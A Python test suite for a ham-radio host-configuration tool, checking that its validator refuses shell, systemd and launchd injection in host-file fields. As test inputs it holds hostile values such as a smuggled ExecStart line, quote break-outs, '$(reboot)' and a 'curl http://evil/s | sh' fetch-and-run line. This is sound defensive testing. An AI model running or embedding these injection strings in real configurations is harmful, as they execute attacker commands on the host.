"""Host-file values can't break out of what they render into.

Host-file strings land on command lines (a unit's space-joined ExecStart, the
hub's raw --mycall/--tnc words, sound card names inside sh -c '...', launchd
labels in commands meant for pasting). Every attack from the 2026-10-21 review
must be refused by render.validate, and every example host file must pass.

    python3 tests/hostfile_safety_test.py
"""
import contextlib
import copy
import io
import json
import shlex
import os
import sys
from pathlib import Path

os.environ["RANCH_RADIO_HOSTS"] = ""     # never this machine's own host files
ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

import tnc_hub  # noqa: E402
from ranch_radio import cli, render  # noqa: E402
from ranch_radio.render import Artifact, HostError, sd_word, validate  # noqa: E402
cli.HOSTS = ROOT / "examples/hosts"

fails = 0


def check(name, got, want):
    global fails
    ok = got == want
    fails += not ok
    print(f"{'ok  ' if ok else 'FAIL'} {name}" + ("" if ok else f"\n     got:  {got!r}\n     want: {want!r}"))


def host(name):
    return json.loads((ROOT / "examples/hosts" / f"{name}.json").read_text())


def refused(name, h, mutate):
    h = copy.deepcopy(h)
    mutate(h)
    try:
        validate(h)
        check(f"refused: {name}", "accepted", "refused")
    except HostError as e:
        check(f"refused: {name}", "refused", "refused")
        return str(e)


for f in sorted((ROOT / "examples/hosts").glob("[!._]*.json")):
    try:
        validate(json.loads(f.read_text()))
        check(f"{f.stem}: today's host file passes", True, True)
    except HostError as e:
        check(f"{f.stem}: today's host file passes", str(e), True)

station_h, mac = host("linux-station"), host("mac-shack")


def setp(path, v):
    def m(h):
        d = h
        for k in path[:-1]:
            d = d[k]
        d[path[-1]] = v
    return m


refused("ardop_logs with a newline (a second unit directive)", station_h,
        setp(("winlink", "ardop_logs"), "/tmp/x\nExecStart=/bin/sh -c 'touch /tmp/pwned'\n#"))
refused("mycall 'N0CALL --tx' (an extra hub argument)", station_h, setp(("packet", "mycall"), "N0CALL --tx"))
refused("tnc with a space", station_h, setp(("packet", "tnc"), "bt:00:11:22:33:44:55 --http-bind 0.0.0.0"))
refused("allow_calls with junk", station_h, setp(("packet", "allow_calls"), ["N9ABC", "x;y"]))
refused("packet tx as a string", station_h, setp(("packet", "tx"), "yes"))
refused("lane as a string", station_h, lambda h: h["radios"][0].update(lane="4537 --evil"))
refused("lane out of range", station_h, lambda h: h["radios"][0].update(lane=70000))
refused("audio_in with a quote (inside sh -c '...')", station_h,
        lambda h: h["radios"][0].update(audio_in="x' ; touch /tmp/pwned ; '"))
refused("device as an option", station_h, lambda h: h["radios"][0].update(device="--help"))
refused("mesh port as an option", station_h, setp(("mesh", "port"), "--mesh-python=/tmp/evil"))
refused("mesh python with a space", station_h, setp(("mesh", "python"), "/usr/bin/python3 -c x"))
refused("radio id with a slash (a unit name)", station_h, lambda h: h["radios"][0].update(id="../g90"))
refused("ardopcf label with ';' (pasted into a shell)", mac,
        setp(("winlink", "ardopcf", "label"), "x; curl http://evil/s | sh"))
refused("ardopcf bin with a space", mac, setp(("winlink", "ardopcf", "bin"), "/bin/sh -c evil"))
refused("radio label with '$(' ", mac, lambda h: h["radios"][0].update(label="a$(reboot)"))
refused("widget label with a space", mac, setp(("integrations", "macos-widget", "label"), "a b"))
refused("pat with a space (shlex.split, then run)", mac, setp(("winlink", "pat"), "pat --evil"))
refused("an add-on name with a dot", mac, lambda h: h["addons"].update({"x.y": {}}))
refused("add-on enabled as a string", mac, lambda h: h["addons"]["opengd77"].update(enabled="true"))
refused("a NUL anywhere, even in a note", mac, setp(("note",), "a\x00b"))
refused("a newline in an add-on's option", mac, lambda h: h["addons"]["opengd77"].update(label="a\nb"))
refused("tx_timeout as text", mac, lambda h: h["radios"][0].update(tx_timeout="60"))
refused("a percent (a systemd specifier)", station_h, setp(("winlink", "ardop_logs"), "%h/../../etc"))

# Things that must stay allowed.
for name, h, m in (
        ("Mac ardopcf sound card with spaces (one plist argument)", mac,
         setp(("winlink", "ardopcf", "audio_in"), "USB Audio CODEC")),
        ("callsign with SSID", station_h, setp(("packet", "mycall"), "N9ABC-10")),
        ("mesh port list of serial and ble", station_h, setp(("mesh", "port"), "/dev/meshtastic,ble:NODEA_fd78")),
        ("codec table", station_h, lambda h: h["radios"][0].update(codec_db="default=-32,40m=-32"))):
    h = copy.deepcopy(h)
    m(h)
    try:
        validate(h)
        check(f"allowed: {name}", True, True)
    except HostError as e:
        check(f"allowed: {name}", str(e), True)

# sd_word: safe words are untouched (units unchanged); anything else stays one word.
check("sd_word leaves a path alone", sd_word("%h/ranch-radio/server.py"), "%h/ranch-radio/server.py")
check("sd_word leaves a pipewire pair alone", sd_word("pipewire:a.b-c,d.e"), "pipewire:a.b-c,d.e")
check("sd_word quotes a space", sd_word("a b"), '"a b"')
check("sd_word escapes quotes, $ and %", sd_word('a"$%'), '"a\\"$$%%"')

# Printed commands quote what they name (a backstop behind validate).
mac_h = render.load(ROOT / "examples/hosts" / "mac-shack.json")
art = Artifact("winlink", "Library/LaunchAgents/x;y.plist", "plist", {"Label": "x; reboot"})
lines = cli.reload_commands(mac_h, [art])
check("reload line quotes a label", lines[0], "launchctl bootout gui/$(id -u)/" + shlex.quote("x; reboot"))
check("  and the plist path", lines[1].endswith(shlex.quote("Library/LaunchAgents/x;y.plist")), True)

# The CLI's --set takes only the template's own fields.
out = io.StringIO()
with contextlib.redirect_stdout(out), contextlib.redirect_stderr(out):
    try:
        cli.main(["add", "uvpro", "--host", "linux-laptop", "--set", "python=/tmp/evil"])
        rc = 0
    except SystemExit as e:
        rc, msg = 1, str(e.code)
check("--set a key the template lacks is refused", (rc, "has no field 'python'" in msg), (1, True))

# packet.aprs and packet.igate.observe: render refuses what the hub would, and
# renders the rest onto its line.
aprs_h = copy.deepcopy(station_h)
aprs_h["packet"]["igate"] = {"login": "N9ABC-10", "passcode": "~/.config/ranch-radio/aprs-is-passcode"}
aprs_h["packet"]["aprs"] = {"messaging": "send", "owned_calls": ["N9ABC"], "firmware_acks": None,
                            "path": ["WIDE1-1", "WIDE2-1"], "txdelay_ms": 250, "ui_total_per_min": 12, "ack_reserve": 4,
                            "msg_per_min": 2, "ack_per_min": 6, "airtime_s_per_min": 15, "ack_airtime_reserve_s": 3}
validate(aprs_h)
argv = render.hub_argv(aprs_h, "/usr/bin/python3", "/r", lambda x: x)
tail = argv[argv.index("--aprs-messaging"):]
check("a messaging block renders onto the hub's line", tail,
      ["--aprs-messaging", "send", "--aprs-owned-calls", "N9ABC", "--aprs-firmware-acks", "null",
       "--aprs-path", "WIDE1-1,WIDE2-1", "--max-ui-total-per-min", "12", "--ack-reserve", "4", "--max-msg-per-min", "2",
       "--max-ack-per-min", "6", "--max-airtime-s-per-min", "15", "--ack-airtime-reserve-s", "3",
       "--aprs-txdelay-ms", "250", "--igate-observe"])
argv_no_ig = render.hub_argv({**aprs_h, "packet": {k: v for k, v in aprs_h["packet"].items() if k != "igate"}},
                             "/usr/bin/python3", "/r", lambda x: x)
a = tnc_hub.parse_args(argv_no_ig[2:])
check("  and the hub reads it back as rendered", (a.aprs_messaging, a.aprs_owned_calls, a.aprs_firmware_acks, a.aprs_path,
      a.max_ui_total_per_min, a.aprs_txdelay_ms), ("send", ["N9ABC"], None, ["WIDE1-1", "WIDE2-1"], 12, 250))
check("observe is off without messaging (today's hosts render as before)",
      "--igate-observe" in render.hub_argv({**aprs_h, "packet": {**aprs_h["packet"], "aprs": {}}}, "p", "/r", lambda x: x),
      False)
check("  and an explicit observe: false wins",
      "--igate-observe" in render.hub_argv({**aprs_h, "packet": {**aprs_h["packet"], "igate": {**aprs_h["packet"]["igate"],
                                            "observe": False}}}, "p", "/r", lambda x: x), False)

probe_h = copy.deepcopy(aprs_h)
probe_h["packet"]["aprs"]["probe"] = {"target": "WXBOT", "text": "wx 85602"}
pargv = render.hub_argv(probe_h, "/usr/bin/python3", "/r", lambda x: x)
check("a probe block renders its target and text",
      pargv[pargv.index("--aprs-probe-target"):pargv.index("--aprs-probe-target") + 4],
      ["--aprs-probe-target", "WXBOT", "--aprs-probe-text", "wx 85602"])


def aprs_set(k, v):
    return lambda h: h["packet"]["aprs"].__setitem__(k, v)


refused("aprs.messaging an unknown mode", aprs_h, aprs_set("messaging", "auto"))
refused("aprs.owned_calls not admitted by allow_calls", aprs_h, aprs_set("owned_calls", ["W1AW"]))
refused("aprs.owned_calls with a shell character", aprs_h, aprs_set("owned_calls", ["N9ABC;x"]))
refused("aprs.firmware_acks a string", aprs_h, aprs_set("firmware_acks", "false"))
refused("aprs.path of three hops", aprs_h, aprs_set("path", ["WIDE1-1", "WIDE2-2", "WIDE3-3"]))
refused("aprs.path with an option in it", aprs_h, aprs_set("path", ["--tx"]))
refused("aprs.ack_reserve not below ui_total_per_min", aprs_h, aprs_set("ack_reserve", 12))
refused("aprs.ui_total_per_min over the overall 300", aprs_h, aprs_set("ui_total_per_min", 301))
refused("aprs.msg_per_min 0", aprs_h, aprs_set("msg_per_min", 0))
refused("aprs.airtime reserve not below the budget", aprs_h, aprs_set("ack_airtime_reserve_s", 15))
refused("aprs.txdelay_ms 5000", aprs_h, aprs_set("txdelay_ms", 5000))
refused("aprs an unknown key", aprs_h, aprs_set("acks", True))
refused("aprs.probe.text with a {", aprs_h, aprs_set("probe", {"target": "WXBOT", "text": "a{b"}))
refused("aprs.probe.target not a call", aprs_h, aprs_set("probe", {"target": "WX BOT", "text": "x"}))
refused("igate.observe not a bool", aprs_h, lambda h: h["packet"]["igate"].__setitem__("observe", "yes"))

print(f"\n{'all passed' if not fails else f'{fails} FAILED'}")
sys.exit(1 if fails else 0)
